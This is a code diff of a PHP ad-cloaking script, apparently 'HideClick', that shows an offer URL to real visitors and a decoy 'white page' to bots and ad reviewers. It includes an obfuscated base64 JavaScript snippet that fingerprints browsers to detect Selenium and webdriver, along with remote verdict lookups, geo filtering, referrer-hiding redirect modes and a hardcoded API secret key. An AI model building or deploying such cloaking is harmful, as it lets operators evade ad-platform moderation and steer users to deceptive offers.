@@ -4,13 +4,8 @@ $HCSET['PASSIVE'] = false;
 
 /* Required settings     */
 $HCSET['OFFER_PAGE'] = 'https://paalmind.com/';//PHP/HTML file or URL offer used for real users
+$HCSET['WHITE_PAGE'] = 'https://chainlink-kino.onrender.com/script.php';//PHP/HTML file or URL used for bots
 $HCSET['DEBUG_MODE'] = 'on';// replace "on" with "off" to switch from debug to production mode
-
-/* OFFER_PAGE display method. Available options: meta, 302, iframe */
-/* 'redirect' -  Redirect visitors using JS location.href (best method if the goal is maximum transitions).*/
-/* 'iframe' - Open URL in iframe. (safest method. requires the use of a SSL to work properly) */
-$HCSET['OFFER_METHOD'] = 'redirect';
-
 /*********************************************/
 /* Available additional settings  */
 
@@ -42,6 +37,17 @@ $HCSET['FILTER_BRO_LIST'] = ''; // string([Chrome|Safari|FF|Other]);
 /* custom AI models and settings for PRO version */
 $HCSET['mlSet'] = '';
 
+/* OFFER_PAGE display method. Available options: meta, 302, iframe */
+/* 'meta' - Use meta refresh to redirect visitors. (default method due to maximum compatibility with different hostings) */
+/* '302' -  Redirect visitors using 302 header (best method if the goal is maximum transitions).*/
+/* 'iframe' - Open URL in iframe. (recommended and safest method. requires the use of a SSL to work properly) */
+$HCSET['OFFER_METHOD'] = 'meta';
+
+/* WHITE_PAGE display method. Available options: curl, 302 */
+/* 'curl' - uses a server request to display third-party whitepage on your domain */
+/* '302' -  uses a 302 redirect to redirect the request to a third-party domain (only for trusted accounts)  */
+$HCSET['WHITE_METHOD'] = 'curl';
+
 /* change 'false' to 'true' to permanently block the IP from which the DDOS attack is coming */
 $HCSET['BLOCK_DDOS'] = false;
 /* DELAY_START allows you to block the first X unique IP addresses. */
@@ -63,23 +69,25 @@ $HCSET['API_SECRET_KEY'] = 'v12b548b7ba2d645d89a5284c96bda0f2f';
 /*********************************************/
 
 $HCSET['groupByDomain'] = '';
-$HCSET['stage'] = 'js2';
+$HCSET['stage'] = '';
 $HCSET['secret'] = '';
 
 // DO NOT EDIT ANYTHING BELOW !!!
-if(!empty($HCSET['VERSION']) || !empty($GLOBALS['HCSET']['VERSION'])) die('Recursion Error');
+if (!empty($HCSET['VERSION']) || !empty($GLOBALS['HCSET']['VERSION'])) die('Recursion Error');
 // dirty hacks to protect from death loops
 if (function_exists('debug_backtrace') && sizeof(debug_backtrace()) > 2) {
     echo "WARNING: INFINITE RECURSION PROTECTION";
     die();
 }
-$HCSET['JS_CODE'] = 'var HDVLKLEQD=function(src){var q=atob("X19zdG9wQWxsVGltZXJzLndlYmRyaXZlci5fX25pZ2h0bWFyZS5fc2VsZW5pdW0uY2FsbFBoYW50b20uY2FsbFNlbGVuaXVtLl9TZWxlbml1bV9JREVfUmVjb3JkZXIuc2VsZW5pdW0uZHJpdmVyLl9zZWxlbml1bS5fX3dlYmRyaXZlcl9ldmFsdWF0ZS5fX3NlbGVuaXVtX2V2YWx1YXRlLl9fd2ViZHJpdmVyX3NjcmlwdF9mdW5jdGlvbi5fX3dlYmRyaXZlcl9zY3JpcHRfZnVuYy5fX3dlYmRyaXZlcl9zY3JpcHRfZm4uX19meGRyaXZlcl9ldmFsdWF0ZS5fX2RyaXZlcl91bndyYXBwZWQuX193ZWJkcml2ZXJfdW53cmFwcGVkLl9fZHJpdmVyX2V2YWx1YXRlLl9fc2VsZW5pdW1fdW53cmFwcGVkLl9fZnhkcml2ZXJfdW53cmFwcGVkLl9waGFudG9tLnBoYW50b20uZG9tQXV0b21hdGlvbl9fbmlnaHRtYXJl").split("."),e=encodeURIComponent,g=0,w=window,d=w.document,n=w.navigator,de="documentElement",s=w.screen,p="",a="avail",i="inner",o="outer",H="Height",W="Width",c=w.chrome?Object.keys(w.chrome).join("*"):"*",tag=d.createElement("script");function wd(){try{for(var l in q){var z=q[l];if(w[z]||n[z])return z;if(d&&d[de]&&d[de].getAttribute&&d[de].getAttribute(z))return z;if(z in w||z in d)return z}return 0}catch(e){}}!function wp(){try{if(n&&n.plugins){Object.keys(n.plugins).forEach(function(i){if(n.plugins[i])p+=n.plugins[i].filename+"*"})}}catch(e){}}();try{g=d.createElement("canvas").getContext("webgl");g=g.getParameter(g.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL)}catch(e){}src="WHITE_PAGE_JS_CODE?clid="+btoa("ref="+e(d.referrer)+"&drive="+wd()+"&c="+c+"&s="+s[a+H]+"*"+w[i+H]+"*"+w[o+H]+"*"+s[a+W]+"*"+w[i+W]+"*"+w[o+W]+"*"+w.devicePixelRatio+"*"+n.maxTouchPoints+"&p="+p+"&h="+n.hardwareConcurrency+"*"+n.deviceMemory+"*"+e(g)+"&t="+e(new Date().toString())+"&q="+e(w.location.search.substr(1)));tag["type"]="text/javascript";tag["src"]=src;document.head.appendChild(tag)}("https://connect.facebook.net/en_US/fbevents.js")';
-$HCSET['VERSION']=20240129;
+$HCSET['VERSION'] = 20240129;
 /* dirty fix!!! uncomment only if problem with IP detection!!! */
 //if(!empty($_SERVER['HTTP_X_REAL_IP'])) $_SERVER['REMOTE_ADDR']=$_SERVER['HTTP_X_REAL_IP'];
 
-$errorContactMessage="<br><br>Something went wrong. Contact support";
-
+$errorContactMessage = "<br><br>Something went wrong. Contact support";
+if (!empty($_GET['utm_allow_geo']) && preg_match('#^[a-zA-Z]{2}$#', $_GET['utm_allow_geo'])) {
+    $HCSET['FILTER_GEO_LIST'] = $_GET['utm_allow_geo'];
+    $HCSET['FILTER_GEO_MODE'] = 'allow';
+}
 if ($HCSET['DISABLE_CACHE']) {
     disable_cache();
 }
@@ -94,19 +102,20 @@ if($HCSET['DEBUG_MODE'] == 'on') {
         die('404');
     }
 }
-if(!empty($_REQUEST['hctest']) && ($HCSET['DEBUG_MODE'] == 'on' || (!empty($_REQUEST['key']) && $_REQUEST['key']==$HCSET['API_SECRET_KEY'])) ) {
+if (!empty($_REQUEST['hctest']) && ($HCSET['DEBUG_MODE'] == 'on' || (!empty($_REQUEST['key']) && $_REQUEST['key'] == $HCSET['API_SECRET_KEY']))) {
     if (function_exists('ini_set')) {
-    ini_set('display_errors', 1);
-    ini_set('display_startup_errors', 1);
+        ini_set('display_errors', 1);
+        ini_set('display_startup_errors', 1);
     }
     if (function_exists('error_reporting')) {
-    error_reporting(E_ALL);
+        error_reporting(E_ALL);
     }
-    if ($_REQUEST['hctest'] == 'offer') showOfferJS($HCSET['OFFER_PAGE'], $HCSET['OFFER_METHOD'], array(), true);
+    if ($_REQUEST['hctest'] == 'offer') showOfferPage($HCSET['OFFER_PAGE'], $HCSET['OFFER_METHOD']);
+    else if ($_REQUEST['hctest'] == 'white') showWhitePage($HCSET['WHITE_PAGE'], $HCSET['WHITE_METHOD']);
     else if ($_REQUEST['hctest'] == 'debug') {
         if (function_exists('phpinfo')) phpinfo();
-        if (function_exists('debug_backtrace')) print_r(debug_backtrace ());
-        $HCSET['API_SECRET_KEY']=1;
+        if (function_exists('debug_backtrace')) print_r(debug_backtrace());
+        $HCSET['API_SECRET_KEY'] = 1;
         print_r(htmlentities(print_r($HCSET,true)));
         die();
     }
@@ -125,12 +134,12 @@ if(!empty($_REQUEST['hctest']) && ($HCSET['DEBUG_MODE'] == 'on' || (!empty($_REQ
             echo "<br>using CURL<br>\n";
             $ch = curl_init();
             echo "HTTP domain";
-            curl_setopt($ch, CURLOPT_URL,'http://api.hideapi.xyz/status');
-            if(!empty($body)) {
+            curl_setopt($ch, CURLOPT_URL, 'http://api.hideapi.xyz/status');
+            if (!empty($body)) {
                 curl_setopt($ch, CURLOPT_POST, 1);
                 curl_setopt($ch, CURLOPT_POSTFIELDS, "$body");
             }
-            if(!empty($returnHeaders)) curl_setopt($ch, CURLOPT_HEADER, 1);
+            if (!empty($returnHeaders)) curl_setopt($ch, CURLOPT_HEADER, 1);
             curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
             curl_setopt($ch, CURLOPT_TIMEOUT, 5);
             curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
@@ -141,19 +150,19 @@ if(!empty($_REQUEST['hctest']) && ($HCSET['DEBUG_MODE'] == 'on' || (!empty($_REQ
             $info = curl_getinfo($ch);
             print_r($info);
             echo "<br>\n";
-            curl_close ($ch);
+            curl_close($ch);
             echo "$r<hr>\n";
         }
     }
     else if ($_REQUEST['hctest'] == 'time') {
-        header( "Cache-control: public, max-age=999999, s-maxage=999999" );
-        header( "Expires: Wed, 21 Oct 2025 07:28:00 GMT" );
-        echo str_replace(" ","",rand(1,10000).microtime().rand(1,100000));
+        header("Cache-control: public, max-age=999999, s-maxage=999999");
+        header("Expires: Wed, 21 Oct 2025 07:28:00 GMT");
+        echo str_replace(" ", "", rand(1, 10000) . microtime() . rand(1, 100000));
     }
     die();
 }
 
-if($HCSET['DEBUG_MODE'] == 'on'){
+if ($HCSET['DEBUG_MODE'] == 'on') {
     $messages = self_test_request($HCSET);
     echo "<html><head>    <style type=\"text/css\">\n        img {\n            opacity: 0.25;\n        }\n        img:hover {\n            opacity: 1.0;\n        }\n        .accordion {\n            --bs-accordion-active-bg: white;\n            --bs-accordion-btn-focus-box-shadow: none;\n        }\n    </style></head><body><script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.min.js\"></script><link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css\" rel=\"stylesheet\">";
     // head
@@ -162,12 +171,9 @@ if($HCSET['DEBUG_MODE'] == 'on'){
     if($messages['errors']) echo "    <div class=\"container my-5\">\n        <h4>Make sure that everything is configured correctly:</h4>\n        <div class=\"col-lg-8 px-4\" id=\"debugMessages\">\n\n        </div>\n        <div class=\"col-lg-8 px-0\">\n            <h5>Correct the errors and reload the page!</h5>\n            <p>Do you need some help? Write to us in telegram: <a href=\"tg://resolve?domain=hideclick\">@hideclick</a>.\n            </p>\n        </div>\n    </div>\n";
     else echo "    <div class=\"container my-5\">\n        <h4>Make sure that everything is configured correctly:</h4>\n        <div class=\"col-lg-8 px-4\" id=\"debugMessages\">\n\n        </div>\n        <div class=\"col-lg-8 px-0\">\n            <p>Do you need some help? Write to us in telegram: <a href=\"tg://resolve?domain=hideclick\">@hideclick</a>.\n            </p>\n        </div>\n    </div>\n";
     // good
-    if(!$messages['errors']) echo "    <div class=\"container my-5\">\n        <h4>Last step:</h4>\n        <div class=\"col-lg-8 px-4\">\n            <p>If everything works without errors, turn off the DEBUG_MODE by changing the value in line <b>#".inlineEditor("\$HCSET['DEBUG_MODE']")."</b> to\n                <b>off</b>.\n            </p>\n            <img src=\"https://hide.click/gif/debug.gif\" border=\"1\"><br><br>\n        </div>\n        <div class=\"col-lg-8 px-0\">\n            <h6>After that, the script will start working in production mode and instead of this page you will some JavaScript code.</h6>\n        </div>\n        <hr class=\"col-1 my-4\">\n    </div>";
+    if(!$messages['errors']) echo "    <div class=\"container my-5\">\n        <h4>Last step:</h4>\n        <div class=\"col-lg-8 px-4\">\n            <p>If everything works without errors, turn off the DEBUG_MODE by changing the value in line <b>#".inlineEditor("\$HCSET['DEBUG_MODE']")."</b> to\n                <b>off</b>.\n            </p>\n            <img src=\"https://hide.click/gif/debug.gif\" border=\"1\"><br><br>\n        </div>\n        <div class=\"col-lg-8 px-0\">\n            <h6>After that, the script will start working in production mode and instead of this page you will see offer\n                page or white page (depends on settings).</h6>\n        </div>\n        <hr class=\"col-1 my-4\">\n    </div>";
     // marketing tips
     echo "<div class=\"container my-5\">\n        <div class=\"accordion\" id=\"marketingTips\">\n            <div class=\"accordion-item\">\n              <h4 class=\"accordion-header\">\n                <button  style=\"background-color: #c2d4e3\" class=\"accordion-button collapsed\" type=\"button\" data-bs-toggle=\"collapse\" data-bs-target=\"#collapsemarketingTips\" aria-expanded=\"true\" aria-controls=\"collapsemarketingTips\">\n                    <h5>Best practices for targeting</h5>\n                </button>\n              </h4>\n                <div id=\"collapsemarketingTips\" class=\"accordion-collapse collapse hide\" data-bs-parent=\"#marketingTips\">\n                    <div class=\"accordion-body\">\n                        <ul>\n                            <li>Always use geotargeting and create separate campaigns for different geos, grouping them by time zones, languages, and similarly performing markets.</li>\n                            <li>Use UTM parameters to track the performance of your marketing campaigns, identify the most effective channels and traffic sources, and optimize your marketing strategy to improve your return on investment. For example:<ul><li>Google/GDN/Youtube:<code>?utm_source=google&utm_campaign={campaignid}&utm_placement={placement}&utm_term={keyword}</code></li><li>Facebook/Instagram:<code>?utm_source=facebook&utm_campaign={{campaign.name}}&utm_placement={{placement}}&utm_term={{site_source_name}}</code></li><li>Tiktok/Bytedance:<code>?utm_source=tiktok&utm_campaign=__CAMPAIGN_NAME__&utm_placement=_PLACEMENT_&utm_term=_CID_NAME_</code></li><li>Reddit:<code>?utm_source=reddit&utm_campaign={{CAMPAIGN_ID}}&utm_placement={{ADVERTISING_ID}}&utm_term={{POST_ID}}</code></li><li>Pinterest:<code>?utm_source=pinterest&utm_campaign={campaignname}&utm_term={keyword}</code></li><li>Snapchat:<code>?utm_source=snapchat&utm_campaign={{campaign.name}}&utm_placement={{site_source_name}}</code></li><li>Outbrain:<code>?utm_source=outbrain&utm_campaign={{campaign_name}}&utm_content={{publisher_name}}&utm_term={{section_name}}</code></li><li>Taboola:<code>?utm_source=taboola&utm_campaign={campaign_name}&utm_placement={site_id}&utm_content={site}&utm_term={site_domain}</code></li><li>Bing/Microsoft:<code>?utm_source=bing&utm_campaign={Campaign}&utm_placement={Network}&utm_content={TargetId}&utm_term={keyword:default}</code></li><li>VK/MyTarget:<code>?utm_source=mytarget&utm_campaign={{campaign_name}}&utm_term={{geo}}_{{gender}}_{{age}}_{{search_phrase}}</code></li><li>Yandex/Dzen:<code>?utm_source=yandex&utm_campaign={campaign_id}&utm_source={source}&utm_placement={source_type}&utm_content={retargeting_id}.{interest_id}.{adtarget_id}&utm_term={keyword}</code></li></ul></li>\n                            <li>You can use this file to launch ad campaigns on other domains, but if the campaign performs poorly, it's recommended to generate a new file with more specific targets for the new campaign.</li>\n                                </ul>\n                        </ul>\n                    </div>\n                </div>\n            </div>\n        </div>\n    </div>";
-
-    echo '<script>var jsencoded=("<"+"script>'.str_replace('"','\\"',$HCSET['JS_CODE']).'<"+"/script>").replace("WHITE_PAGE_JS_CODE",location.href);</script>';
-    $messages['warnings'][]='Add JavaScript to your white page. Edit HTML and add JS code after &lt;HEAD&gt; tag: <code><input type="text" value="" id="myInput"><button onclick="copy()">copy JS code to clipboard</button></code><br><br>';
 
     echo "<script>let messages=".json_encode($messages)."</script>";
     echo "<script>let uri=new URL(document.location);let endpoint=uri.origin+uri.host+uri.pathname; const debugMessages = document.getElementById('debugMessages');</script>";
@@ -176,13 +182,16 @@ if($HCSET['DEBUG_MODE'] == 'on'){
     echo "<script>if(messages.errors) messages.errors.forEach(message => {  const li = document.createElement('p'); li.innerHTML = '❌ Error: '+message+'</p>';  debugMessages.appendChild(li);});</script>";
     echo "<script>if(messages.warnings) messages.warnings.forEach(message => {  const listItem = document.createElement('p');  listItem.innerHTML = '⚠️ Warning: '+message;  debugMessages.appendChild(listItem);});</script>";
     echo "<script>if(messages.notes) messages.notes.forEach(message => {  const listItem = document.createElement('p');  listItem.innerHTML = '❔ Notice: '+message;  debugMessages.appendChild(listItem);});</script>";
-    echo '<script>document.getElementById("myInput").value = jsencoded;function copy(){document.getElementById("myInput").select();document.getElementById("myInput").setSelectionRange(0, 999999);document.execCommand("copy");}</script>';
     echo '</body></html>';
     die();
 }
-else if($HCSET['PASSIVE']!==true) {
-    if (empty($HCSET['OFFER_PAGE']) || (!strstr($HCSET['OFFER_PAGE'], '://'))) {
-        echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>ERROR: Non valid offer page: OFFER_PAGE='" . $HCSET['OFFER_PAGE'] . "'!\r\n<br>" . $errorContactMessage;
+else if ($HCSET['PASSIVE'] !== true) {
+    if (empty($HCSET['WHITE_PAGE']) || (!strstr($HCSET['WHITE_PAGE'], '://') && !is_file($HCSET['WHITE_PAGE']))) {
+        echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>ERROR FILE NOT FOUND: " . $HCSET['WHITE_PAGE'] . "! \r\n<br>" . $errorContactMessage;
+        die();
+    }
+    if (empty($HCSET['OFFER_PAGE']) || (!strstr($HCSET['OFFER_PAGE'], '://') && !is_file($HCSET['OFFER_PAGE']))) {
+        echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>ERROR FILE NOT FOUND: " . $HCSET['OFFER_PAGE'] . "! \r\n<br>" . $errorContactMessage;
         die();
     }
     if (function_exists('header_remove')) header_remove("X-Powered-By");
@@ -215,32 +224,16 @@ if ($HCSET['DELAY_START']) {
         $HCSET['banReason'] .= 'delaystartperm.';
     }
 }
-// decode clid data
-$getvars=array();
-$originQuery = array();
-if(!empty($_GET['clid']) && base64_decode($_GET['clid'])) {
-    parse_str(base64_decode($_GET['clid']),$getvars);
-    if($getvars) {
-        $HCSETdata['QUERY_STRING'] = base64_decode($_GET['clid']);
-        if($HCSETdata['path']) $HCSETdata['path'] = preg_replace('#\?clid=.*#', '?' . $HCSETdata['QUERY_STRING'], $HCSETdata['path']);
-        if($HCSETdata['REQUEST_URI']) $HCSETdata['REQUEST_URI'] = preg_replace('#\?clid=.*#', '?' . $HCSETdata['QUERY_STRING'], $HCSETdata['path']);
-        $_GET['ref'] = $getvars['ref'];
-        $_GET['q'] = $getvars['q'];
-        if(!empty($_GET['q'])){
-            $originQuery = array();
-            parse_str(urldecode($_GET['q']),$originQuery);
-            if (!empty($originQuery['utm_allow_geo']) && preg_match('#^[a-zA-Z]{2}$#', $originQuery['utm_allow_geo'])) {
-                $HCSET['FILTER_GEO_LIST'] = $originQuery['utm_allow_geo'];
-                $HCSET['FILTER_GEO_MODE'] = 'allow';
-            }
-        }
-    }
-}
 
 $HCSETdata = json_encode($HCSETdata);
 // Data for ML postprocessing
+$tmpWhite = (substr($HCSET['WHITE_PAGE'], 0, 8) == 'https://' || substr($HCSET['WHITE_PAGE'], 0, 7) == 'http://') ? '' : file_get_contents($HCSET['WHITE_PAGE']);
 $tmpOffer = (substr($HCSET['OFFER_PAGE'], 0, 8) == 'https://' || substr($HCSET['OFFER_PAGE'], 0, 7) == 'http://') ? '' : file_get_contents($HCSET['OFFER_PAGE']);
+$HCSET['W_CRC'] = crc32($tmpWhite);
 $HCSET['O_CRC'] = crc32($tmpOffer);
+if(preg_match_all('#[\'"]https://[^/]*(yandex|google|facebook|bytedance|linkedin|twitter|adobe|pinterest|doubleclick|bing|hubspot|marketo|oracle|salesforce|snapchat|reddit|quora|outbrain|taboola|adroll|criteo|appnexus|thetradedesk|mediamath|amazon|hotjar|mouseflow|crazyegg|mixpanel|intercom|zendesk|freshchat|drift|mailchimp|campaignmonitor|constantcontact|klaviyo|drip|activecampaign|getresponse|aweber|convertkit|shopify|woocommerce|magento|bigcommerce|squarespace|wix|wordpress|joomla|drupal|weebly|jimdo|godaddy|strikingly|webflow|optimizely)[^\'"]+\.js#', $tmpWhite,$match)){
+    $HCSET['W_PIXELS'] = implode(',',$match[1]);
+}
 if(preg_match_all('#[\'"]https://[^/]*(yandex|google|facebook|bytedance|linkedin|twitter|adobe|pinterest|doubleclick|bing|hubspot|marketo|oracle|salesforce|snapchat|reddit|quora|outbrain|taboola|adroll|criteo|appnexus|thetradedesk|mediamath|amazon|hotjar|mouseflow|crazyegg|mixpanel|intercom|zendesk|freshchat|drift|mailchimp|campaignmonitor|constantcontact|klaviyo|drip|activecampaign|getresponse|aweber|convertkit|shopify|woocommerce|magento|bigcommerce|squarespace|wix|wordpress|joomla|drupal|weebly|jimdo|godaddy|strikingly|webflow|optimizely)[^\'"]+\.js#', $tmpOffer,$match)){
     $HCSET['O_PIXELS'] = implode(',',$match[1]);
 }
@@ -263,88 +256,124 @@ if ($HCSET['BLOCK_DDOS']) {
     }
 }
 
-if($HCSET['PASSIVE']!==true) {
-    header("Content-Type: application/javascript");
+if ($HCSET['PASSIVE'] !== true) {
     if (empty($HCSET['banReason']) && !empty($HCSET['STATUS']) && !empty($HCSET['STATUS']['action']) && $HCSET['STATUS']['action'] == 'allow') {
         setcookie('hcsid', hashDev($HCSET), time() + 604800);
-        showOfferJS($HCSET['OFFER_PAGE'], $HCSET['OFFER_METHOD'], $HCSET['STATUS']);
+        showOfferPage($HCSET['OFFER_PAGE'], $HCSET['OFFER_METHOD'], $HCSET['STATUS']);
     } else {
-        showWhiteJS();
+        showWhitePage($HCSET['WHITE_PAGE'], $HCSET['WHITE_METHOD'], $HCSET['STATUS']);
     }
     die();
 }
 
-function showOfferJS($offer, $method = 'meta', $status = array(), $includeHTML=false)
+function showOfferPage($offer, $method = 'meta', $status = array())
 {
-    if (!empty($_GET['q']) && !strstr($method,'privacy')) {
-        if (strstr($offer, '?')) $offer .= '&' . urldecode($_GET['q']);
-        else $offer .= '?' . urldecode($_GET['q']);
-    }
+    if (substr($offer, 0, 8) == 'https://' || substr($offer, 0, 7) == 'http://') {
+        if (!empty($_GET) && !stristr($method,'privacy')) {
+            if (strstr($offer, '?')) $offer .= '&' . http_build_query($_GET);
+            else $offer .= '?' . http_build_query($_GET);
+        }
 
-    if (strstr($offer, '{hc_geo}')) {
-        if(!empty($status['geo'])) $offer = str_replace('{hc_geo}', $status['geo'], $offer);
-    } else if (strstr($offer, '%7Bhc_geo%7D')) {
-        if(!empty($status['geo'])) $offer = str_replace('%7Bhc_geo%7D', $status['geo'], $offer);
-    }
-    if (strstr($offer, '{hc_uid}')) {
-        if(!empty($status['uid'])) $offer = str_replace('{hc_uid}', $status['uid'], $offer);
-    } else if (strstr($offer, '%7Bhc_uid%7D')) {
-        if(!empty($status['uid'])) $offer = str_replace('%7Bhc_uid%7D', $status['uid'], $offer);
-    }
-    if (strstr($offer, '{hc_ref}')) {
-        if(!empty($_GET['ref'])) $offer = str_replace('{hc_ref}', urlencode($_GET['ref']), $offer);
-    } else if (strstr($offer, '%7Bhc_ref%7D')) {
-        if(!empty($_GET['ref'])) $offer = str_replace('%7Bhc_ref%7D', urlencode($_GET['ref']), $offer);
-    }
+        if (strstr($offer, '{hc_geo}')) {
+            if(!empty($status['geo'])) $offer = str_replace('{hc_geo}', $status['geo'], $offer);
+        } else if (strstr($offer, '%7Bhc_geo%7D')) {
+            if(!empty($status['geo'])) $offer = str_replace('%7Bhc_geo%7D', $status['geo'], $offer);
+        }
+        if (strstr($offer, '{hc_uid}')) {
+            if(!empty($status['uid'])) $offer = str_replace('{hc_uid}', $status['uid'], $offer);
+        } else if (strstr($offer, '%7Bhc_uid%7D')) {
+            if(!empty($status['uid'])) $offer = str_replace('%7Bhc_uid%7D', $status['uid'], $offer);
+        }
+        if (strstr($offer, '{hc_ref}')) {
+            if(!empty($_SERVER['HTTP_REFERER'])) $offer = str_replace('{hc_ref}', urlencode($_SERVER['HTTP_REFERER']), $offer);
+        } else if (strstr($offer, '%7Bhc_ref%7D')) {
+            if(!empty($_SERVER['HTTP_REFERER'])) $offer = str_replace('%7Bhc_ref%7D', urlencode($_SERVER['HTTP_REFERER']), $offer);
+        }
 
-    $page = base64_encode($offer);
-
-    if ($method == 'iframe') {
-        $output = 'try {window.stop();}catch (e) {document.execCommand("Stop");}document.getElementsByTagName("html")[0].innerHTML = "<head><style>html, body, iframe {margin: 0;padding: 0;height : 100%; width: 100%;}</style></head><body></body>";!function() {if (document.getElementsByTagName("head").length > 0){var e = document.createElement("meta");e.name = "viewport",e.content = "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0",document.getElementsByTagName("head")[0].appendChild(e);}}();document.getElementsByTagName("body")[0].innerHTML = "<iframe src=\'' . base64_decode($page) . '\' style=\'visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;\' allowfullscreen=\'allowfullscreen\' webkitallowfullscreen=\'webkitallowfullscreen\' mozallowfullscreen=\'mozallowfullscreen\'></iframe>";';
+        if ($method == '302privacy') {
+            header("Referrer-Policy: no-referrer");
+            header("Content-Security-Policy: referrer no-referrer");
+            header("Location: " . $offer);
+        } else if ($method == '302') {
+            header("Location: " . $offer);
+        } else if ($method == 'iframeprivacy') {
+            header("Referrer-Policy: no-referrer");
+            header("Content-Security-Policy: referrer no-referrer");
+            echo "<html><head><title></title></head><body style='margin: 0; padding: 0;'><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0\"/><iframe src='" . $offer . "' style='visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;' allowfullscreen='allowfullscreen' webkitallowfullscreen='webkitallowfullscreen' mozallowfullscreen='mozallowfullscreen' rel='noreferrer noopener'></iframe></body></html>";
+        } else if ($method == 'iframe') {
+            echo "<html><head><title></title></head><body style='margin: 0; padding: 0;'><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0\"/><iframe src='" . $offer . "' style='visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;' allowfullscreen='allowfullscreen' webkitallowfullscreen='webkitallowfullscreen' mozallowfullscreen='mozallowfullscreen'></iframe></body></html>";
+        } else if ($method == 'metaprivacy') {
+            header("Referrer-Policy: no-referrer");
+            header("Content-Security-Policy: referrer no-referrer");
+            echo '<html><head><meta http-equiv="Refresh" content="0; URL=' . $offer . '" ></head></html>';
+        } else {
+            echo '<html><head><meta http-equiv="Refresh" content="0; URL=' . $offer . '" ></head></html>';
+        }
+    } else {
+        require_once($offer);
     }
-    else if ($method == 'iframeiframeprivacy') {
-        $output = 'try {window.stop();}catch (e) {document.execCommand("Stop");}document.getElementsByTagName("html")[0].innerHTML = "<head><style>html, body, iframe {margin: 0;padding: 0;height : 100%; width: 100%;}</style><meta name="referrer" content="no-referrer" /></head><body></body>";!function() {if (document.getElementsByTagName("head").length > 0){var e = document.createElement("meta");e.name = "viewport",e.content = "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0",document.getElementsByTagName("head")[0].appendChild(e);}}();document.getElementsByTagName("body")[0].innerHTML = "<iframe referrerpolicy="no-referrer" src=\'' . base64_decode($page) . '\' style=\'visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;\' allowfullscreen=\'allowfullscreen\' webkitallowfullscreen=\'webkitallowfullscreen\' mozallowfullscreen=\'mozallowfullscreen\'></iframe>";';
-    }
-    else if ($method == 'redirectprivacy') {
-        $output = 'try {window.stop();}catch (e) {document.execCommand("Stop");}document.getElementsByTagName("html")[0].innerHTML = "<head><meta name="referrer" content="no-referrer" /></head>";location.href="' . base64_decode($page) . '"';
-    }
-    else {
-        $output = 'try {window.stop();}catch (e) {document.execCommand("Stop");}document.getElementsByTagName("html")[0].innerHTML = "";location.href="' . base64_decode($page) . '"';
-    }
-    if($includeHTML){
-        echo "<html><head><script>$output</script></head><body></body></html>";
-    }
-    else echo $output;
     die();
 }
 
-function showWhiteJS()
+function showWhitePage($white, $method = 'curl', $status = array())
 {
-    echo "var b=document.createElement('script');b[\"type\"] =\"text/javascript\";b[\"src\"] =\"https://connect.facebook.net/en_US/fbevents.js\";document.head.appendChild(b);";
+    if (substr($white, 0, 8) == 'https://' || substr($white, 0, 7) == 'http://') {
+        if (!empty($_GET) && !stristr($method,'privacy')) {
+            if (strstr($white, '?')) $white .= '&' . http_build_query($_GET);
+            else $white .= '?' . http_build_query($_GET);
+        }
+        if (strstr($white, '{hc_geo}')) {
+            if(!empty($status['geo'])) $white = str_replace('{hc_geo}', $status['geo'], $white);
+        } else if (strstr($white, '%7Bhc_geo%7D')) {
+            if(!empty($status['geo'])) $white = str_replace('%7Bhc_geo%7D', $status['geo'], $white);
+        }
+        if (strstr($white, '{hc_uid}')) {
+            if(!empty($status['uid'])) $white = str_replace('{hc_uid}', $status['uid'], $white);
+        } else if (strstr($white, '%7Breq_uid%7D')) {
+            if(!empty($status['uid'])) $white = str_replace('%7Bhc_uid%7D', $status['uid'], $white);
+        }
+
+        if ($method == '302privacy') {
+            header("Referrer-Policy: no-referrer");
+            header("Content-Security-Policy: referrer no-referrer");
+            header("Location: " . $white);
+        } else if ($method == '302') {
+            header("Location: " . $white);
+        } else {
+            $page = http_request($white);
+            $page = $page["body"];
+            $page = preg_replace('#(<head[^>]*>)#imU', '$1<base href="' . $white . '">', $page, 1);
+            $page = preg_replace('#https://connect\.facebook\.net/[a-zA-Z_-]+/fbevents\.js#imU', '', $page);
+            if (empty($page)) {
+                header("HTTP/1.1 503 Service Unavailable", true, 503);
+            }
+            echo $page;
+        }
+    } else require_once($white);// bots
     die();
 }
 
 function inlineEditor($s)
 {
-    $f=file($_SERVER["SCRIPT_FILENAME"]);
-    $r=0;
-    foreach ($f as $n=>$l) {
-        if(strstr($l,$s)) {
-            $r=$n;
+    $f = file($_SERVER["SCRIPT_FILENAME"]);
+    $r = 0;
+    foreach ($f as $n => $l) {
+        if (strstr($l, $s)) {
+            $r = $n;
             break;
         }
     }
-    return $r+1;
+    return $r + 1;
 }
 
 function blockDDOS()
 {
-    $ips=file('dummyDDOS.txt',FILE_IGNORE_NEW_LINES);
+    $ips = file('dummyDDOS.txt', FILE_IGNORE_NEW_LINES);
     foreach ($ips as $ip) {
-        if(!empty($ip)) {
-            foreach ($_SERVER as $key=>$val) {
+        if (!empty($ip)) {
+            foreach ($_SERVER as $key => $val) {
                 // we can block single IP, or use IP mask if needed.
